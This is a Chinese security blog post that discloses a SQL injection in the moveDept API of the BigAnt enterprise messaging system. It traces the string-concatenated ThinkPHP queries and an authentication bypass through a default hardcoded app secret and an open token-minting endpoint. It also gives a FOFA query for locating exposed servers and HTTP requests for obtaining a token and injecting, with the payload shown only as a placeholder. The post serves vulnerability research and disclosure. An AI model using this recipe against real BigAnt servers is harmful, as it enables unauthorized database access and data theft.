---
title: "大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞"
source: https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html
---

# 大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/27 13:17
* 362浏览
* [0评论](#comment)
* 1小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Api\Controller\DeptController::moveDept 接口存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞，攻击者可通过在 moveDept 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。

# 影响版本

BigAnt 5.5.x 及以上版本用户

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

## 注入分析

系统是基于thinkphp 3.2架构，大部分采用数组形式的参数传递不存在sql注入

在 ThinkPHP 3.2 中：

* `->where(array条件)`
  使用
  **数组方式**
  传参是安全的（框架会自动参数绑定/转义）
* `->where("字符串拼接")`
  使用
  **字符串拼接**
  外部输入是
  **危险的**
* `->query($sql)`
  /
  `->execute($sql)`
  直接执行原生 SQL，如果拼接了用户输入则存在注入风险
* `I()`
  函数虽有基本过滤，但不能完全防止 SQL 注入（特别是在字符串拼接场景下）

但是部分控制器的部分方法如
**DeptController.class.php**
下的
**moveDept()**
方法中

```
public function moveDept()
{
    $deptId = $this->q('dept_id',1);
    $parentDeptId = $this->q('target_parentdept_id',0);
    if ($deptId == $parentDeptId) {
       $this->responseFail(ERR_OP_ERR,L('_DEPT_MIGRATION_CAN_USE_YOURSELF_'));
    }
    //根据部门名称获取部门id
    $DeptModel = D('Common/Dept');
    $deptId = $DeptModel->field('dept_id,dept_parent_id')->where("dept_id = '".$deptId."'")->find();
......
if (!empty($parentDeptId)) {
    $parentDept = $DeptModel->where("dept_id = '".$parentDeptId."'")->getField('dept_id');
```

`$deptId`
和
`$parentDeptId`
均来自用户请求参数
`$this->q()`
，直接拼接到
`where`
字符串中，攻击者可通过构造恶意
`dept_id`
参数注入SQL payload造成
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
。

## 权限分析

先看下控制器开头的初始化操作权限要求

```
function _initialize() {

    parent::_initialize();
    $this->model = D('Common/Dept');
}
```

跟进
`\Api\Controller\ApiBaseController::_initialize`
看下

```
function _initialize() {
//        $this->request = new Request();

        //\Common\Lib\SaasSDK::autoFirstSaas();
        sp_log_url();

        $model_name = strtolower(CONTROLLER_NAME."/".ACTION_NAME);
        $allowArr=[
           'oauth/create_authen',
           'dept/dept_list_redis',
          'dept/op_record_list',
          'schedule/backup',
          'schedule/clear_file',
          'schedule/message',
          'server/server_status',
           'office/office_callback',
           'jinshan/authorize',
        ];

        if (!in_array($model_name, $allowArr)&&$this->isValidAuth){
            \Common\Lib\SaasSDK::autoFirstSaas();
            $this->validAuthen();
        }
    }
```

除了规定的部分接口如
`oauth/create_authen`
、
`dept/dept_list_redis`
等不需要鉴权，其余（当前控制器开启了鉴权验证时,默认开启）都需要经过
`validAuthen`
方法鉴权，大致流程如下

```
请求进入 → _initialize() 自动触发
    ↓
记录日志 (sp_log_url)
    ↓
生成当前路由标识 (控制器/动作)
    ↓
检查是否在白名单？
    ├─ 是 → 跳过鉴权，直接进入 Action 方法
    └─ 否 → 检查是否需要鉴权 ($isValidAuth)
            ├─ 否 → 跳过鉴权，进入 Action
            └─ 是 → 初始化 SaaS 租户环境
                   ↓
                   执行 validAuthen() 验证用户身份
                   ↓
                   通过 → 进入 Action
                   失败 → 返回 401/403 或跳转登录
```

而
`validAuthen()`
方法的鉴权逻辑如下

```
protected  function validAuthen(){
        $saas_id = D('Common/Saas')->getField('saas_id');
        $authen = $this->q('authen',1);
        $appId = $this->q('app_id',0,APP_ID);
        $saasId = $this->q('ssid',0, $saas_id);
        $userId = $this->q('uid',1,1);
        $userName = $this->q('uname',0,"系统管理员");
        $res = \Common\Lib\SaasSDK::apiLogin($saasId,$userId,$appId,$authen);

    if (! $res['status']){
        $this->responseApi($res) ;
    }
        $this->appId = $appId ;
        $this->saasId = $saasId ;
        $this->userId = $userId;
        $this->userName = $userName ;
}
```

我们需要提供
**authen、uid**
其中uid好理解，就是用户id,且默认是1，重点关注
**authen**
的生成，

总体流程如下

```
请求到达 → _initialize() → validAuthen()
    ↓
1. 获取默认租户（兜底）
2. 提取请求参数：
   ├─ authen (Token, 必填)
   ├─ uid (用户ID, 必填)
   ├─ ssid (租户ID, 可选)
   ├─ app_id (应用ID, 可选)
   └─ uname (用户名, 可选)
    ↓
3. SaaasSDK::apiLogin() 验证：
   ├─ Token 解密与签名验证
   ├─ 用户-租户关系校验
   └─ 权限时效检查
    ↓
4. 验证失败 → responseApi() 返回 401/403
   验证成功 → 保存身份信息到控制器属性
    ↓
进入业务 Action 方法（可通过 $this->userId 获取用户）
```

跟进
`\Common\Lib\SaasSDK::apiLogin($saasId,$userId,$appId,$authen)`
看下是如何验证的

```
static function apiLogin($ssid,$uid,$appId,$authen){

        //到服务配置中认证
        $res = \Common\Lib\Oauth::validAuthen($authen, $appId, $ssid, $uid) ;

        //如果验证未通过
        if (! $res['status'])
                return $res ;

        //接口每次登录效率太低
        return self::trustLogin($ssid, $uid,'api') ;
}
```

跟进
`validAuthen`

```
static function validAuthen($authen,$appId,$ssid,$uid){
        //得到密钥
        $info = self::getAppInfo($appId);
        $appSecret = '' ;
        if (! $info){
                return sp_api_fail(ERR_OP_ERR, L('_APPID_NOT_EXIST_')) ;
}

        $appSecret = $info['app_secret'] ;
        $res = self::bulidAuthen($appId, $appSecret, $ssid, $uid) == $authen ;

        return $res?sp_api_success():sp_api_fail(ERR_OP_ERR, L('_AUTH_CODE_ERROR_')) ;

}
```

先看
`getAppInfo`

```
static function getAppInfo($appId){

        $data = F('oauth_client') ;

        foreach($data as $row){
                if ($row['app_id'] == $appId){
                        return $row ;
                }
        }
        return null ;
}
```

从oauth\_client表提取出
`app_id`
，oauth\_client表默认如下

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/c31abc55a1e64f82b586c16d85371cec.webp)

其中
`app_id`
为 system、yun对应的APP\_SECRET均为
`www.upsoft01.com`
，继续跟进
`self::bulidAuthen($appId, $appSecret, $ssid, $uid) == $authen ;`
看下它的实现方式

```
/**
 * 生成认证码
 * @param string $appId
 * @param string $appSecret
 * @param string $ssid
 * @param string $uid
 * @return string
 */
static function bulidAuthen($appId,$appSecret,$ssid,$uid){
        return hash('sha256', $appId . $appSecret . $ssid . $uid) ;
}
```

到此，如何获得authen也就清楚了，可以手动生成，也可以通过最开始分析的白名单部分，那里有个接口
`oauth/create_authen`
，它的实现逻辑如下

```
/**
 * 获取 认证码的接口
 * @eg  http://127.0.0.1:8010/api/oauth/create_authen
 */
public function create_authen(){
        $uid = $this->q('uid',1);
        $app_id = $this->q('app_id',1);
        $app_secret = $this->q('app_secret',1);

        $saas_id = $this->q('ssid');

        $res = \Common\Lib\Oauth::bulidAuthen($app_id,$app_secret,$saas_id, $uid) ;
        $this->responseSuccess(['authen'=>$res]);
}
```

只需要提供
**uid**
、app\_id、app\_secret、
**ssid**
即可，其中ssid来自sys\_saas表

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/31103c6436d94279b500d5dceb754091.webp)

或者通过后台的修改头像部分获取，如下图所示

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/15e590d5fd724be294966c4bf23488fe.webp)

# 漏洞复现

## 获取认证码

```
POST /api/oauth/create_authen HTTP/1.1
Host: bigant.local:8000
Content-Type: application/x-www-form-urlencoded

uid=1&app_id=system&app_secret=www.upsoft01.com&ssid=CC1743B5-E5D5-42CE-B5F6-42E24464C8D0
```

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/d3c2cc2af06e4564a0a00ea1b0428719.webp)

使用获取到的
**authen：cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d**

## SQL注入

> 两个参数均存在SQL注入
>
> 多种thinkphp传参、路由模式需要注意

```
POST /api/dept/moveDept HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=SQLI_POC
```

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/f3639ebe9c4646c3b2d50bfca1debfda.webp)

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/6a30fba8ff1d4250aa4022c3e5da005f.webp)

```
POST /index.php?s=/api/dept/moveDept HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=100&target_parentdept_id=SQLI_POC
```

![大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://image.mrxn.net/d15acfeff69e4af3a278485aaf824b88.webp)

成功利用报错注入获取到系统数据库用户信息。

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  php](https://mrxn.net/tag/php)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  MySQL](https://mrxn.net/tag/MySQL)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});